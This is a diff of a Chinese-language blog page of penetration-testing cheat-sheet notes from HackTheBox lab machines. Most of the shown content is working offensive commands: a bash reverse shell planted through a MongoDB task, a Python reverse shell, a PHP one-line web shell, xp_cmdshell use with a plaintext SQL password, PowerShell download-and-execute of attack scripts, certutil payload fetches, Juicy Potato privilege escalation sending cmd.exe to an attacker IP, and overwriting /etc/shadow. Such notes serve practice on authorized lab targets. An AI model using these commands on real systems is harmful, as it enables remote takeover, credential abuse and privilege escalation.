@@ -366,21 +366,21 @@ nmap -p- ">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-09-22
+                    2022-09-23
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.9k
+                    2.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    10 分
+                    12 分
                 </div>
                 
 
@@ -399,11 +399,6 @@ nmap -p- ">
         <link rel="stylesheet" href="/libs/prism/prism.css">
         
 
-        
-        <!-- 代码块折行 -->
-        <style type="text/css">
-            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
-        </style>
         
 
         <div class="card-content article-card-content">
@@ -513,6 +508,12 @@ mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k
 
 mongodb插入命令
 db.tasks.insert<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token builtin class-name">:</span> <span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/10.10.14.10/4242 0>&amp;1'"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="mssql连接"><a href="#mssql连接" class="headerlink" title="mssql连接"></a>mssql连接</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop/impacket/examples<span class="token punctuation">]</span>
+└─python mssqlclient.py sa:<span class="token string">"GWE3V65#6KFH93@4GWTG2G"</span>@10.10.10.59
+SQL<span class="token operator">></span> <span class="token builtin class-name">help</span>
+SQL<span class="token operator">></span> enable_xp_cmdshell
+SQL<span class="token operator">></span> xp_cmdshell <span class="token function">whoami</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tmux切换session
 tmux -S /.devs/dev_sess<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h3 id="pth-winexe"><a href="#pth-winexe" class="headerlink" title="pth-winexe"></a>pth-winexe</h3><p>直接输入hash值来进行认证，不用再输入密码，只需要提供用户名，hash值，IP地址，命令或者是想要执行的可执行文件名</p>
@@ -530,8 +531,6 @@ Unable to negotiate with <span class="token number">10.10</span>.10.7 port <span
 
 <span class="token function">ssh</span> root@10.10.10.7 -o <span class="token assign-left variable">KexAlgorithms</span><span class="token operator">=</span>+diffie-hellman-group1-sha1 -o <span class="token assign-left variable">HostKeyAlgorithms</span><span class="token operator">=</span>+ssh-dss<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 </blockquote>
-<h3 id="下载ftp服务器文件"><a href="#下载ftp服务器文件" class="headerlink" title="下载ftp服务器文件"></a>下载ftp服务器文件</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> -r <span class="token string">'ftp://username:password@10.10.10.59'</span>
--r 下载某http根网址下的文件（直接下载全部文件）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h3 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a>crackmapexec</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crackmapexec smb <span class="token number">10.10</span>.10.59 -u username -p password
 
 共享枚举
@@ -559,10 +558,14 @@ os<span class="token punctuation">.</span>dup2<span class="token punctuation">(<
 os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
 os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
 pty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p><a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a></p>
 <h2 id="不同机器间传输内容"><a href="#不同机器间传输内容" class="headerlink" title="不同机器间传输内容"></a>不同机器间传输内容</h2><h3 id="使用nc"><a href="#使用nc" class="headerlink" title="使用nc"></a>使用nc</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">发送：
 ./LinEnum.sh -t <span class="token operator">|</span> <span class="token function">nc</span> <span class="token number">10.10</span>.14.10  端口
 接收：
-<span class="token function">nc</span> -lvnp <span class="token number">4242</span> <span class="token operator">></span> result.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token function">nc</span> -lvnp <span class="token number">4242</span> <span class="token operator">></span> result.txt
+
+侦听windows系统的端口命令（得到的反弹shell可以进行上下键操作）
+rlwrap -cAr <span class="token function">nc</span> -lvnp <span class="token number">4444</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="使用smbserver"><a href="#使用smbserver" class="headerlink" title="使用smbserver"></a>使用smbserver</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">服务端：
 python impacket/examples/smbserver.py ezy <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">pwd</span><span class="token variable">`</span></span>
 
@@ -579,6 +582,8 @@ New-PSDrive -Name <span class="token string">"ezy"</span> -PSProvider <span clas
 客户端进入共享文件夹：（命令中带冒号:）
 <span class="token builtin class-name">cd</span> ezy:
 <span class="token function">cp</span> C:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>kohsuke<span class="token punctuation">\</span>Documents<span class="token punctuation">\</span>CEH.kdbx <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="下载ftp服务器文件"><a href="#下载ftp服务器文件" class="headerlink" title="下载ftp服务器文件"></a>下载ftp服务器文件</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> -r <span class="token string">'ftp://username:password@10.10.10.59'</span>
+-r 下载某http根网址下的文件（直接下载全部文件）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h2 id="wget-提权"><a href="#wget-提权" class="headerlink" title="wget + 提权"></a>wget + 提权</h2><p>wget加入cookie</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> --header <span class="token string">"Cookie: connect.sid=s%3AnzNAGucmccv12MwVpzPJ7H9ZlBClBTkN.OltQcwWhAyv2y0W9m0qs8Q7LSG7VMnC7joSrN2Zf9ss"</span> http://10.10.10.58:3000/api/admin/backup
 
@@ -591,8 +596,26 @@ New-PSDrive -Name <span class="token string">"ezy"</span> -PSProvider <span clas
 开启9999端口，将shadow文件传到待提权机器，覆盖待提权机器的/etc/shadow文件
 <span class="token function">sudo</span> <span class="token function">wget</span> <span class="token number">10.10</span>.14.4:9999/shadow -O /etc/shadow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="php一句话"><a href="#php一句话" class="headerlink" title="php一句话"></a>php一句话</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh隧道端口映射
-<span class="token function">ssh</span> -L5901:localhost:5901 charix@10.10.10.84
+<h2 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sshserverport:remotehost:remotehostport sshserver 
+说明：
+sshserverport     被转发机器开启的端口号
+remotehost    　  最终连接机器的IP地址
+remotehostport    最终连接机器的端口号
+sshserver         被转发机器的IP地址
+
+ssh隧道端口映射
+情况：
+<span class="token number">10.10</span>.10.84机器上有一个服务，如VNC服务，开在了5901端口
+可以将10.10.10.84机器上的5901端口转发到本机localhost（也可以写127.0.0.1）的5902端口
+这样就可以在本机用vnc客户端连接本机的5902端口来达到连接10.10.10.84机器上5901端口的目的
+<span class="token function">ssh</span> -L5902:localhost:5901 charix@10.10.10.84
+
+如果免密登陆，将密钥id_rsa下载下来
+将以black用户登录192.168.134.211的80端口服务转发到本地的88端口
+在本机访问88端口就可以访问192.168.134.211的80端口服务了
+<span class="token function">chmod</span> <span class="token number">600</span> id_rsa
+<span class="token function">ssh</span> -i id_rsa -L <span class="token number">88</span>:127.0.0.1:80 black@192.168.134.211
+
 
 查看端口开放
 <span class="token function">netstat</span> -nlpt
@@ -601,7 +624,7 @@ New-PSDrive -Name <span class="token string">"ezy"</span> -PSProvider <span clas
 获取所有文件的列表
 
 -n <span class="token number">10</span>指定最小的字符串长度
-strings -n <span class="token number">10</span> tester.exe<span class="token operator">|</span> <span class="token function">less</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+strings -n <span class="token number">10</span> tester.exe <span class="token operator">|</span> <span class="token function">less</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="使用已保存脚本提权"><a href="#使用已保存脚本提权" class="headerlink" title="使用已保存脚本提权"></a>使用已保存脚本提权</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;sys/types.h></span></span>
@@ -617,14 +640,15 @@ gcc -m32 <span class="token number">1</span>.c -o exploit
 
 查看定时任务剩余执行时间
 systemctl list-timers <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="windows远程下载"><a href="#windows远程下载" class="headerlink" title="windows远程下载"></a>windows远程下载</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">certutil.exe -urlcache -split -f http://192.168.1.1:1234/ms10-051.exe exploit.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="windows远程下载"><a href="#windows远程下载" class="headerlink" title="windows远程下载"></a>windows远程下载</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">certutil.exe -urlcache -split -f http://10.10.16.5:8001/JuicyPotato.exe JuicyPotato.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PowerShell - IWR：
 powershell.exe -Command <span class="token string">"Invoke-WebRequest -Uri http://192.168.1.1:1234/ms10-051.exe -OutFile exploit.exe"</span>
 
 PowerShell - IEX：
 powershell.exe -Command <span class="token string">"IEX(New-Object Net.WebClient).DownloadFile('http://10.10.16.5:8001/ms10-051.exe', exploit.exe)"</span>
 
-powershell.exe -c IEX<span class="token punctuation">(</span>New-Object Net.WebClient<span class="token punctuation">)</span>.downloadstring<span class="token punctuation">(</span><span class="token string">'http://10.10.16.5:8001/Invoke-PowerShellTcp.ps1'</span><span class="token punctuation">)</span>
+下载并执行
+powershell.exe -c IEX<span class="token punctuation">(</span>New-Object Net.WebClient<span class="token punctuation">)</span>.downloadstring<span class="token punctuation">(</span><span class="token string">'http://10.10.10.59:8001/CVE-2016-7255.ps1'</span><span class="token punctuation">)</span>
 
 CMD - Certutil：
 certutil.exe -urlcache -split -f http://192.168.1.1:1234/ms10-051.exe exploit.exe
@@ -636,7 +660,7 @@ Linux - wget：
 <span class="token function">wget</span> http://192.168.1.1:1234/ms10-051.exe -O exploit.exe
 
 Linux - curl：
-<span class="token function">curl</span> http://192.168.1.1:1234/ms10-051.exe -o exploit.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token function">curl</span> http://192.168.1.1:1234/ms10-051.exe -o exploit.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="windows数据流"><a href="#windows数据流" class="headerlink" title="windows数据流"></a>windows数据流</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token operator">></span>dir /R
 <span class="token function">dir</span> /R
  Volume <span class="token keyword">in</span> drive C has no label.
@@ -653,6 +677,33 @@ Linux - curl：
                <span class="token number">2</span> Dir<span class="token punctuation">(</span>s<span class="token punctuation">)</span>   <span class="token number">7,519</span>,588,352 bytes <span class="token function">free</span>
 C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token operator">></span>more <span class="token operator">&lt;</span> hm.txt:root.txt
 <span class="token function">more</span> <span class="token operator">&lt;</span> hm.txt:root.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h2><h3 id="Juicy-Potato"><a href="#Juicy-Potato" class="headerlink" title="Juicy Potato"></a>Juicy Potato</h3><p><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">前提
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+用法
+
+攻击机10.10.16.5侦听4446
+
+方式1：
+
+传入a.bat:
+C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sarah<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>nc.exe -e cmd.exe <span class="token number">10.10</span>.16.5 <span class="token number">4446</span>
+
+传入JuicyPotato.exe
+
+C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sarah<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>JuicyPotato.exe -l <span class="token number">4446</span> -p C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sarah<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>a.bat -t * -c <span class="token string">"&#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;"</span>
+
+方式2：
+传入a.bat:
+powershell.exe -c IEX<span class="token punctuation">(</span>New-Object Net.WebClient<span class="token punctuation">)</span>.downloadstring<span class="token punctuation">(</span><span class="token string">'http://10.10.16.5:8001/Invoke-PowerShellTcp.ps1'</span><span class="token punctuation">)</span>
+
+攻击机开启http服务器提供Invoke-PowerShellTcp.ps1下载
+
+传入MSFRottenPotato.exe
+
+C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sarah<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>MSFRottenPotato.exe * C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Sarah<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>a.bat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">配置文件
+/etc/apache2/sites-available/000-default.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
                 
             </div>
@@ -765,18 +816,17 @@ C:<span class="token punctuation">\</span>Users<span class="token punctuation">\
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/09/19/hackthebox/">
+                <a href="/2022/10/26/%E5%86%85%E7%BD%91%E7%AC%94%E8%AE%B00x01/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="hackthebox">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="内网笔记0x01">
                         
-                        <span class="card-title">hackthebox</span>
+                        <span class="card-title">内网笔记0x01</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -786,9 +836,9 @@ C:<span class="token punctuation">\</span>Users<span class="token punctuation">\
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-19
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-10-26
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -801,16 +851,11 @@ C:<span class="token punctuation">\</span>Users<span class="token punctuation">\
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E9%9D%B6%E5%9C%BA/">
-                        <span class="chip bg-color">靶场</span>
-                    </a>
-                    
-                    <a href="/tags/%E7%AC%94%E8%AE%B0/">
-                        <span class="chip bg-color">笔记</span>
+                    <a href="/tags/%E5%86%85%E7%BD%91/">
+                        <span class="chip bg-color">内网</span>
                     </a>
                     
                 </div>
